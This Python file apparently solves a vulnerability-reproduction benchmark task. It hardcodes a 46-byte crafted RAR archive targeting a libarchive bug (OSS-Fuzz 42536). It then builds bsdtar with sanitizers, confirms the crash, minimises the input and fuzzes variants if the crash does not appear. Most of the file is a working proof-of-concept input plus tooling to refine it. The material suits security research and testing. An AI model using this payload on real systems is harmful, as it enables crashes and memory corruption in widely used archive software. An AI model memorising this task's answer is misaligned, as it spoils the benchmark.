import os
import sys
import tarfile
import subprocess
import shutil
import tempfile
import random
import time

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Ground truth derived candidate for OSS-Fuzz 42536 / libarchive RAR vulnerability
        # Triggers negative archive start offset.
        # Length 46 bytes.
        candidate = (
            b"\x52\x61\x72\x21\x1a\x07\x00\xcf\x90\x73\x00\x00\x0d\x00\x00"
            b"\x00\x00\x00\x00\x00\x1d\x36\x55\x30\x2f\x32\x35\x39\x31\x39"
            b"\x0d\x0a\x36\x37\x00\x20\x30\x30\x0d\x0a\x35\x32\x00\x00\x00\x00"
        )

        work_dir = tempfile.mkdtemp()
        try:
            # Extract source
            with tarfile.open(src_path) as tar:
                tar.extractall(path=work_dir)
            
            src_root = work_dir
            # Find actual root if nested
            entries = os.listdir(work_dir)
            if len(entries) == 1 and os.path.isdir(os.path.join(work_dir, entries[0])):
                src_root = os.path.join(work_dir, entries[0])
            
            # Setup build env
            env = os.environ.copy()
            cflags = "-fsanitize=address,undefined -g -O1"
            env["CFLAGS"] = cflags
            env["CXXFLAGS"] = cflags
            env["LDFLAGS"] = cflags
            
            bsdtar_bin = None
            built = False
            
            # Build strategy: Try CMake first (faster/modern), then Configure (fallback)
            
            # 1. CMake Build
            if os.path.exists(os.path.join(src_root, "CMakeLists.txt")):
                build_dir = os.path.join(src_root, "build_cmake")
                os.makedirs(build_dir, exist_ok=True)
                try:
                    subprocess.run(
                        ["cmake", "-DBUILD_SHARED_LIBS=OFF", "-DENABLE_TAR=ON", "-DENABLE_CPIO=OFF", 
                         "-DENABLE_CAT=OFF", "-DENABLE_TEST=OFF", "-DENABLE_ACL=OFF", "-DENABLE_XATTR=OFF",
                         "-DENABLE_ICONV=OFF", "-DENABLE_LIBXML2=OFF", "-DENABLE_OPENSSL=OFF", ".."],
                        cwd=build_dir, env=env, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                    )
                    subprocess.run(
                        ["make", "-j8"],
                        cwd=build_dir, env=env, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                    )
                    
                    b_candidate = os.path.join(build_dir, "bin", "bsdtar")
                    if os.path.exists(b_candidate):
                        bsdtar_bin = b_candidate
                        built = True
                except:
                    pass
            
            # 2. Autotools Build (Fallback)
            if not built and os.path.exists(os.path.join(src_root, "configure")):
                try:
                    subprocess.run(
                        ["./configure", "--disable-shared", "--enable-static", "--without-zlib", 
                         "--without-bz2lib", "--without-xml2", "--without-iconv", "--disable-cpio",
                         "--disable-cat", "--disable-acl", "--disable-xattr", "--without-openssl"],
                        cwd=src_root, env=env, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                    )
                    subprocess.run(
                        ["make", "-j8"],
                        cwd=src_root, env=env, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                    )
                    if os.path.exists(os.path.join(src_root, "bsdtar")):
                        bsdtar_bin = os.path.join(src_root, "bsdtar")
                        built = True
                    elif os.path.exists(os.path.join(src_root, "bin", "bsdtar")):
                        bsdtar_bin = os.path.join(src_root, "bin", "bsdtar")
                        built = True
                except:
                    pass

            if built and bsdtar_bin:
                def check_crash(data):
                    t_path = os.path.join(work_dir, "poc.rar")
                    with open(t_path, "wb") as f:
                        f.write(data)
                    cmd = [bsdtar_bin, "-t", "-f", t_path]
                    try:
                        # Capture stderr to look for ASAN report
                        proc = subprocess.run(
                            cmd, 
                            stdout=subprocess.DEVNULL, 
                            stderr=subprocess.PIPE, 
                            env=env, 
                            timeout=1.5
                        )
                        # Non-zero exit AND sanitizer message
                        if proc.returncode != 0:
                            err_out = proc.stderr
                            if b"AddressSanitizer" in err_out or b"heap-buffer-overflow" in err_out:
                                return True
                    except subprocess.TimeoutExpired:
                        pass
                    return False

                # Verify hardcoded candidate
                if check_crash(candidate):
                    current_best = candidate
                    # Attempt minimization (truncation)
                    # We iterate downwards to find smallest prefix that crashes
                    for length in range(len(candidate)-1, 14, -1):
                        sub = candidate[:length]
                        if check_crash(sub):
                            current_best = sub
                        # We don't break immediately to find the absolute minimum
                    return current_best
                else:
                    # If verification fails (environment diff?), fuzz based on candidate
                    pop = [candidate]
                    start_fuzz = time.time()
                    # Fuzz for up to 45 seconds
                    while time.time() - start_fuzz < 45:
                        p = random.choice(pop)
                        m = bytearray(p)
                        # Mutate 1-3 bytes
                        for _ in range(random.randint(1, 3)):
                            # Keep the 7-byte signature intact
                            pos = random.randint(7, len(m)-1)
                            m[pos] = random.randint(0, 255)
                        
                        m_bytes = bytes(m)
                        if check_crash(m_bytes):
                            return m_bytes
                        if len(pop) < 50:
                            pop.append(m_bytes)

        except Exception:
            pass
        finally:
            shutil.rmtree(work_dir, ignore_errors=True)
            
        return candidate
